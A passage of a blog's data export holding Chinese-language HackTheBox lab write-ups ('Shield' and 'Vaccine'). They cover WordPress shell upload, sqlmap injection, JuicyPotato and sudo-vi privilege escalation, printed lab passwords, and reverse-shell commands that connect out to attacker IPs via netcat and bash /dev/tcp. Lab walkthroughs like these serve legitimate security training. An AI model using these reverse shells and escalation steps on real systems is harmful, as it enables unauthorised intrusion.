shell\n\n![](https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png)\n\n在管理员账户的桌面目录下找到flag\n\n![](https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png)\n\n","source":"_posts/HackTheBox-Shield.md","raw":"---\ntitle: HackTheBox-Shield\ndate: 2021-08-18 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png)\n\n## 信息收集\n\n**端口扫描**：\n\n```\nnamp -A -T4 10.10.10.29\n```\n\n发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows\n\n![](https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png)\n\n`--script vuln`参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址\n\n![](https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png)\n\n**目录扫描**，也发现wordpress目录\n\n![](https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png)\n\n**Wpscan分析**，可以看到wordpress的版本\n\n```\nwpscan --url http://10.10.10.29/wordpress\n```\n\n![](https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png)\n\n## 实验过程\n\n用上一台靶机的账号密码可以登录后台`admin`:`P@s5w0rd!`\n\n![](https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png)\n\n知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块\n\n![](https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png)\n\n设置参数\n\n![](https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png)\n\n执行exploit命令后，获得shell\n\n![](https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png)\n\n在shell中执行命令\n\n![](https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png)\n\n查看wp-config.php，发现敏感信息\n\n![](https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png)\n\n**反弹shell**：\n\n在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口\n\n![](https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png)\n\n在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell\n\n![](https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png)\n\n![](https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png)\n\n查看当前用户\n\n![](https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png)\n\n**提权:**\n\n使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到\n\n将js.exe上传到对方机器\n\n![](https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png)\n\n在windows shell中生成一个bat脚本：\n\n```\necho START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 > shell.bat\n```\n\n![](https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png)\n\n在本机使用nc创建一个监听端口，用来接收提权后的windows shell\n\n![](https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png)\n\n运行juicy-potato提权：\n\n```\njs.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n```\n\n![](https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png)\n\n获得system权限的windows shell\n\n![](https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png)\n\n在管理员账户的桌面目录下找到flag\n\n![](https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png)\n\n","slug":"HackTheBox-Shield","published":1,"updated":"2021-09-30T13:32:02.514Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5tt0005wsvt7x4p1q7t","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>\n<pre><code>namp -A -T4 10.10.10.29\n</code></pre>\n<p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png\"></p>\n<p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>\n<p><img src=\"https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png\"></p>\n<p><strong>目录扫描</strong>，也发现wordpress目录</p>\n<p><img src=\"https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png\"></p>\n<p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>\n<pre><code>wpscan --url http://10.10.10.29/wordpress\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>\n<p><img src=\"https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png\"></p>\n<p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png\"></p>\n<p>设置参数</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png\"></p>\n<p>执行exploit命令后，获得shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png\"></p>\n<p>在shell中执行命令</p>\n<p><img src=\"https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png\"></p>\n<p>查看wp-config.php，发现敏感信息</p>\n<p><img src=\"https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png\"></p>\n<p><strong>反弹shell</strong>：</p>\n<p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png\"></p>\n<p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png\"></p>\n<p>查看当前用户</p>\n<p><img src=\"https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png\"></p>\n<p><strong>提权:</strong></p>\n<p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>\n<p>将js.exe上传到对方机器</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png\"></p>\n<p>在windows shell中生成一个bat脚本：</p>\n<pre><code>echo START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png\"></p>\n<p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png\"></p>\n<p>运行juicy-potato提权：</p>\n<pre><code>js.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png\"></p>\n<p>获得system权限的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png\"></p>\n<p>在管理员账户的桌面目录下找到flag</p>\n<p><img src=\"https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>\n<pre><code>namp -A -T4 10.10.10.29\n</code></pre>\n<p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png\"></p>\n<p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>\n<p><img src=\"https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png\"></p>\n<p><strong>目录扫描</strong>，也发现wordpress目录</p>\n<p><img src=\"https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png\"></p>\n<p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>\n<pre><code>wpscan --url http://10.10.10.29/wordpress\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>\n<p><img src=\"https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png\"></p>\n<p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png\"></p>\n<p>设置参数</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png\"></p>\n<p>执行exploit命令后，获得shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png\"></p>\n<p>在shell中执行命令</p>\n<p><img src=\"https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png\"></p>\n<p>查看wp-config.php，发现敏感信息</p>\n<p><img src=\"https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png\"></p>\n<p><strong>反弹shell</strong>：</p>\n<p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png\"></p>\n<p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png\"></p>\n<p>查看当前用户</p>\n<p><img src=\"https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png\"></p>\n<p><strong>提权:</strong></p>\n<p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>\n<p>将js.exe上传到对方机器</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png\"></p>\n<p>在windows shell中生成一个bat脚本：</p>\n<pre><code>echo START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png\"></p>\n<p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png\"></p>\n<p>运行juicy-potato提权：</p>\n<pre><code>js.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png\"></p>\n<p>获得system权限的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png\"></p>\n<p>在管理员账户的桌面目录下找到flag</p>\n<p><img src=\"https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png\"></p>\n"},{"title":"HackTheBox-Vaccine","date":"2021-07-13T09:05:21.000Z","_content":"\n## 实验环境\n\n![Screenshot_2021-08-04_09_35_14](https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sC -sV 10.10.10.46\n```\n\n![Screenshot_2021-08-02_11_35_34](https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png)\n\n看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码\n\n![Screenshot_2021-08-02_11_38_54](https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png)\n\n因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录\n\n```\nftpuser/mc@F1l3ZilL4\n```\n\n![Screenshot_2021-08-02_11_40_03](https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png)\n\n直接输入上一题中获得的用户名和密码可以成功登录\n\n![Screenshot_2021-08-02_11_40_34](https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png)\n\n可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码\n\n![Screenshot_2021-08-02_11_40_55](https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png)\n\n我们直接使用john来爆破\n\n```\nzip2john backup.zip > hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n```\n\n![Screenshot_2021-08-02_11_47_56](https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png)\n\n得到压缩包密码`7418529630`，解压后有`index.php`，从代码中可以看到用户名和md5加密的密码\n\n![Screenshot_2021-08-02_11_48_29](https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png)\n\n将md5加密的密码到在线的md5解密网站解密，得到密码为`qwerty789`\n\n![Screenshot_2021-08-02_11_49_39](https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png)\n\n回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下\n\n![Screenshot_2021-08-02_14_15_39](https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png)\n\n## 实验过程\n\n试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入\n\n![Screenshot_2021-08-02_14_15_53](https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png)\n\n那就直接用sqlmap跑，注意cookie要改成自己的值\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\"\n```\n\n![Screenshot_2021-08-03_09_22_43](https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png)\n\n![Screenshot_2021-08-03_09_26_33](https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png)\n\n可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\" --os-shell\n```\n\n![Screenshot_2021-08-03_09_27_03](https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png)\n\n接下来反弹shell，开启一个监听端口\n\n![Screenshot_2021-08-03_09_27_50](https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png)\n\n在sqlmap的shell中输入\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.15.60/1234 0>&1'\n```\n\n![Screenshot_2021-08-03_09_28_01](https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png)\n\n成功接收到反弹的shell\n\n![Screenshot_2021-08-03_09_28_19](https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png)\n\n![Screenshot_2021-08-03_09_29_41](https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png)\n\n先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码\n\n![Screenshot_2021-08-03_09_31_35](https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png)\n\n接下来先得到交互式的shell\n\n```\n#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n得到交互式的shell后，可以通过`sudo -l`命令查看当前用户的权限，用户被允许编辑配置文件`/etc/postgresql/11/main/pg_hba.conf`，可以利用`vi`并验证密码提权至`root`\n\n```\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n```\n\n![Screenshot_2021-08-03_09_33_34](https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png)\n\n![Screenshot_2021-08-03_09_34_36](https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png)\n\n输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得`root`权限\n\n```\n:!/bin/bash\n```\n\n![Screenshot_2021-08-03_09_35_30](https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png)\n\n最后就可以读取root的flag了\n\n![Screenshot_2021-08-03_09_36_08](https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png)\n\n\n\n> 参考：\n>\n> https://www.echocipher.life/index.php/archives/891/\n\n","source":"_posts/HackTheBox-Vaccine.md","raw":"---\ntitle: HackTheBox-Vaccine\ndate: 2021-07-13 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![Screenshot_2021-08-04_09_35_14](https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sC -sV 10.10.10.46\n```\n\n![Screenshot_2021-08-02_11_35_34](https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png)\n\n看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码\n\n![Screenshot_2021-08-02_11_38_54](https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png)\n\n因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录\n\n```\nftpuser/mc@F1l3ZilL4\n```\n\n![Screenshot_2021-08-02_11_40_03](https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png)\n\n直接输入上一题中获得的用户名和密码可以成功登录\n\n![Screenshot_2021-08-02_11_40_34](https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png)\n\n可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码\n\n![Screenshot_2021-08-02_11_40_55](https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png)\n\n我们直接使用john来爆破\n\n```\nzip2john backup.zip > hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n```\n\n![Screenshot_2021-08-02_11_47_56](https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png)\n\n得到压缩包密码`7418529630`，解压后有`index.php`，从代码中可以看到用户名和md5加密的密码\n\n![Screenshot_2021-08-02_11_48_29](https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png)\n\n将md5加密的密码到在线的md5解密网站解密，得到密码为`qwerty789`\n\n![Screenshot_2021-08-02_11_49_39](https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png)\n\n回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下\n\n![Screenshot_2021-08-02_14_15_39](https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png)\n\n## 实验过程\n\n试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入\n\n![Screenshot_2021-08-02_14_15_53](https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png)\n\n那就直接用sqlmap跑，注意cookie要改成自己的值\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\"\n```\n\n![Screenshot_2021-08-03_09_22_43](https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png)\n\n![Screenshot_2021-08-03_09_26_33](https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png)\n\n可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell\n\n```\nsqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie=\"PHPSESSID=1ah5j9312pm8sf4sktan1gdll1\" --os-shell\n```\n\n![Screenshot_2021-08-03_09_27_03](https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png)\n\n接下来反弹shell，开启一个监听端口\n\n![Screenshot_2021-08-03_09_27_50](https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png)\n\n在sqlmap的shell中输入\n\n```\nbash -c 'bash -i >& /dev/tcp/10.10.15.60/1234 0>&1'\n```\n\n![Screenshot_2021-08-03_09_28_01](https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png)\n\n成功接收到反弹的shell\n\n![Screenshot_2021-08-03_09_28_19](https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png)\n\n![Screenshot_2021-08-03_09_29_41](https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png)\n\n先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码\n\n![Screenshot_2021-08-03_09_31_35](https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png)\n\n接下来先得到交互式的shell\n\n```\n#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n得到交互式的shell后，可以通过`sudo -l`命令查看当前用户的权限，用户被允许编辑配置文件`/etc/postgresql/11/main/pg_hba.conf`，可以利用`vi`并验证密码提权至`root`\n\n```\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n```\n\n![Screenshot_2021-08-03_09_33_34](https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png)\n\n![Screenshot_2021-08-03_09_34_36](https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png)\n\n输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得`root`权限\n\n```\n:!/bin/bash\n```\n\n![Screenshot_2021-08-03_09_35_30](https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png)\n\n最后就可以读取root的flag了\n\n![Screenshot_2021-08-03_09_36_08](https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png)\n\n\n\n> 参考：\n>\n> https://www.echocipher.life/index.php/archives/891/\n\n","slug":"HackTheBox-Vaccine","published":1,"updated":"2021-09-29T09:27:41.758Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5tu0006wsvtdwaj3crl","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png\" alt=\"Screenshot_2021-08-04_09_35_14\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sC -sV 10.10.10.46\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png\" alt=\"Screenshot_2021-08-02_11_35_34\"></p>\n<p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png\" alt=\"Screenshot_2021-08-02_11_38_54\"></p>\n<p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>\n<pre><code>ftpuser/mc@F1l3ZilL4\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png\" alt=\"Screenshot_2021-08-02_11_40_03\"></p>\n<p>直接输入上一题中获得的用户名和密码可以成功登录</p>\n<p><img src=\"https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png\" alt=\"Screenshot_2021-08-02_11_40_34\"></p>\n<p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png\" alt=\"Screenshot_2021-08-02_11_40_55\"></p>\n<p>我们直接使用john来爆破</p>\n<pre><code>zip2john backup.zip &gt; hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png\" alt=\"Screenshot_2021-08-02_11_47_56\"></p>\n<p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png\" alt=\"Screenshot_2021-08-02_11_48_29\"></p>\n<p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p>\n<p><img src=\"https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png\" alt=\"Screenshot_2021-08-02_11_49_39\"></p>\n<p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p>\n<p><img src=\"https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png\" alt=\"Screenshot_2021-08-02_14_15_39\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>\n<p><img src=\"https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png\" alt=\"Screenshot_2021-08-02_14_15_53\"></p>\n<p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png\" alt=\"Screenshot_2021-08-03_09_22_43\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png\" alt=\"Screenshot_2021-08-03_09_26_33\"></p>\n<p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png\" alt=\"Screenshot_2021-08-03_09_27_03\"></p>\n<p>接下来反弹shell，开启一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png\" alt=\"Screenshot_2021-08-03_09_27_50\"></p>\n<p>在sqlmap的shell中输入</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png\" alt=\"Screenshot_2021-08-03_09_28_01\"></p>\n<p>成功接收到反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png\" alt=\"Screenshot_2021-08-03_09_28_19\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png\" alt=\"Screenshot_2021-08-03_09_29_41\"></p>\n<p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png\" alt=\"Screenshot_2021-08-03_09_31_35\"></p>\n<p>接下来先得到交互式的shell</p>\n<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n</code></pre>\n<p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>\n<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png\" alt=\"Screenshot_2021-08-03_09_33_34\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png\" alt=\"Screenshot_2021-08-03_09_34_36\"></p>\n<p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>\n<pre><code>:!/bin/bash\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png\" alt=\"Screenshot_2021-08-03_09_35_30\"></p>\n<p>最后就可以读取root的flag了</p>\n<p><img src=\"https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png\" alt=\"Screenshot_2021-08-03_09_36_08\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://www.echocipher.life/index.php/archives/891/\">https://www.echocipher.life/index.php/archives/891/</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png\" alt=\"Screenshot_2021-08-04_09_35_14\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sC -sV 10.10.10.46\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png\" alt=\"Screenshot_2021-08-02_11_35_34\"></p>\n<p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png\" 